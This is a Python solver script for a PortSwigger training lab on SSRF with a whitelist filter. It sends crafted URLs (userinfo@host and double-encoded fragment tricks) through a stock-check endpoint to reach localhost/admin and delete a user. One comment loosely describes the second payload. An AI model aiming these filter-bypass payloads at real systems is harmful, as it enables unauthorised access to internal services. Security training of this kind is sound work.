"""
Lab 7: SSRF with whitelist-based input filter
https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter
Difficulty: Expert

📝 Only URLs matching the trusted hostname pattern pass validation. Exploit
a URL-parsing mismatch between whatever validates the string and whatever
actually makes the HTTP request: embedding credentials in the URL
(userinfo@host syntax) can make a regex-based validator see the trusted
hostname while the real HTTP client connects to a totally different host.
"""

from utils import get_session, log, note, stock_check

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
TRUSTED_HOST = "stock.weliketoshop.net"  # confirm the real expected hostname from the app


def run():
    s = get_session()

    candidates = [
        # userinfo trick: validator may regex for "stock.weliketoshop.net"
        # anywhere in the string and be satisfied, while requests/the
        # server's HTTP client treats localhost as the actual host.
        f"http://{TRUSTED_HOST}@localhost/admin/delete?username=carlos",
        # Same idea, reversed order with an '@' the validator might miss
        # if it's checking a prefix rather than doing real URL parsing.
        f"http://localhost%2523{TRUSTED_HOST}/admin/delete?username=carlos",
    ]

    for url in candidates:
        r = stock_check(s, TARGET, "1", url)
        log(f"{url} -> status {r.status_code}")
        if r.status_code == 200 and "blocked" not in r.text.lower():
            log("Looks like a bypass — verify against the admin panel response.")
            print(r.text[:500])
            return

    note("If neither candidate works, the validator's exact pattern needs")
    note("inspecting more closely (view the error message's wording on a")
    note("rejected request — it often reveals whether it's regex or")
    note("proper URL-object based, which changes which trick applies).")


if __name__ == "__main__":
    run()
